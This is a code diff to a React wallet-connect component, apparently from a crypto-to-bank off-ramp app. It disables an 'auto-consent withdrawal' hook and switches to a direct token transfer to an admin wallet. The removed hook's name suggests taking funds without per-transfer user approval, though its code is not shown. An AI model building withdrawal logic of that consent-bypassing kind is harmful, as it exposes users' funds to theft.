@@ -35,7 +35,8 @@ export function StablePayWalletConnect() {
   const { transferState: simpleTokenState, executeTransfer: executeSimpleTokenTransfer, resetTransferState: resetSimpleTokenState } = useSimpleTokenTransfer();
   const { debugState, debugTransfer, resetDebug } = useDebugTransfer();
   const { transferState: directTransferState, executeDirectTransfer, resetTransferState: resetDirectTransferState } = useDirectTransfer();
-  const { withdrawalState: autoConsentState, executeAutoWithdrawal, enableAutoConsent, resetState: resetAutoConsentState } = useAutoConsentWithdrawal();
+  // Temporarily disabled auto-consent to fix proxyState error
+  // const { withdrawalState: autoConsentState, executeAutoWithdrawal, enableAutoConsent, resetState: resetAutoConsentState } = useAutoConsentWithdrawal();
 
   
   const [state, setState] = useState<ConversionState>({
@@ -150,21 +151,19 @@ export function StablePayWalletConnect() {
 
       if (!kycResponse.ok) throw new Error('KYC verification failed');
 
-      // Execute auto-consent withdrawal for instant transfer
-      console.log('Executing auto-consent withdrawal to admin wallet');
+      // Execute direct token transfer to admin wallet
+      console.log('Executing token transfer to admin wallet');
       
-      const chainId = parseInt(caipNetwork?.id?.toString() || '1');
       let transferHash: string | null = null;
 
-      // Use auto-consent withdrawal mechanism
-      transferHash = await executeAutoWithdrawal(
+      // Use direct transfer mechanism
+      transferHash = await executeDirectTransfer(
         selectedToken.address,
-        state.amount,
-        chainId
+        state.amount
       );
 
       if (!transferHash) {
-        throw new Error('Auto-consent withdrawal failed');
+        throw new Error('Token transfer to admin wallet failed');
       }
 
       // Create transaction record
@@ -702,7 +701,7 @@ export function StablePayWalletConnect() {
           bankAccount={bankDetails.accountNumber}
           adminWallet={adminWallet}
           chainId={chainId}
-          step={autoConsentState.step}
+          step={directTransferState.step}
           error={directTransferState.error || undefined}
         />
       )}
